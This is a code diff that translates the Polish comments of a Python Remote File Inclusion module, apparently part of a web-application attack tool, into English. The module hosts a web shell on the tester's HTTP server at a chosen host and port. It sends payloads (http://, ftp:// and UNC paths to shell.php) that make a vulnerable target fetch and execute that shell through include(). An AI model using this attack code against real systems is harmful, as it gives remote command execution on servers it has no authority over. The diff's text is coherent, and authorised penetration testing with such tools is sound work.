@@ -1,17 +1,17 @@
-"""RFI (Remote File Inclusion) — payloady + auto-hostowanie web-shella po HTTP.
+"""RFI (Remote File Inclusion) — payloads + auto-hosted web shell over HTTP.
 
-Wymaga --lhost/--lport (Config już je ma, ale nie było modułu, który by z nich
-korzystał). Gdy oba podane, moduł stawia lekki serwer HTTP na 0.0.0.0:{lport}
-serwujący web-shell z komendą (+ RCE_MARKER) i wysyła payload wskazujący na
-http://{lhost}:{lport}/shell.php — cel sam go pobierze i wykona przy include().
+Requires --lhost/--lport (Config already has them, but no module used them
+until now). When both are given, this module stands up a lightweight HTTP
+server on 0.0.0.0:{lport} serving a web shell with the command (+
+RCE_MARKER), and sends a payload pointing to http://{lhost}:{lport}/shell.php
+— the target fetches and executes it on include().
 
-Warianty ftp:// i UNC (\\\\LHOST\\share\\...) są generowane jako payloady, ale
-BEZ auto-hostowania — wymagają własnego serwera FTP/SMB po stronie testera,
-poza zakresem tego narzędzia (analogicznie do `zip_phar`, który wymaga
-wgranego archiwum przez --file).
+ftp:// and UNC (\\\\LHOST\\share\\...) variants are generated as payloads,
+but WITHOUT auto-hosting — they need your own FTP/SMB server, out of scope
+for this tool (same as `zip_phar`, which needs an uploaded archive via --file).
 
-⚠️ Nie ustawiaj --lhost na adres samego celu — include() zapętli się na
-własnej odpowiedzi (self-inclusion).
+Do not set --lhost to the target's own address — include() will loop on
+its own response (self-inclusion).
 """
 from __future__ import annotations
 
@@ -25,7 +25,7 @@ from .base import BaseModule
 
 
 class _ShellServer:
-    """Minimalny async serwer HTTP serwujący jeden web-shell pod każdą ścieżką."""
+    """Minimal async HTTP server serving one web shell for any path."""
 
     def __init__(self, port: int, cmd: str):
         self._port = port
@@ -62,22 +62,23 @@ class _ShellServer:
 
 
 class RFIModule(BaseModule):
-    """Remote File Inclusion — wymaga --lhost/--lport; auto-hostuje web-shell po HTTP."""
+    """Remote File Inclusion — requires --lhost/--lport; auto-hosts the web shell over HTTP."""
     name = "rfi"
-    description = "RFI (http/ftp/UNC) — z --lhost/--lport auto-hostuje web-shell po HTTP"
+    description = "RFI (http/ftp/UNC) — with --lhost/--lport, auto-hosts a web shell over HTTP"
+    verifiable = False  # the hosted shell server is gone once run() returns
 
     def payloads(self) -> Iterator[str]:
         if not (self.cfg.lhost and self.cfg.lport):
             return
         base = f"{self.cfg.lhost}:{self.cfg.lport}"
         yield f"http://{base}/shell.php"
-        yield f"ftp://{base}/shell.php"                    # wymaga własnego serwera FTP
-        yield f"\\\\{self.cfg.lhost}\\share\\shell.php"     # UNC, wymaga własnego SMB
+        yield f"ftp://{base}/shell.php"                    # needs your own FTP server
+        yield f"\\\\{self.cfg.lhost}\\share\\shell.php"     # UNC, needs your own SMB server
 
     async def run(self, client: HttpClient) -> list[Finding]:
         if not (self.cfg.lhost and self.cfg.lport):
             if self.cfg.verbose:
-                print("    [rfi] pominięto — brak --lhost/--lport")
+                print("    [rfi] skipped — no --lhost/--lport")
             return []
         findings: list[Finding] = []
         async with _ShellServer(self.cfg.lport, self.cfg.cmd):
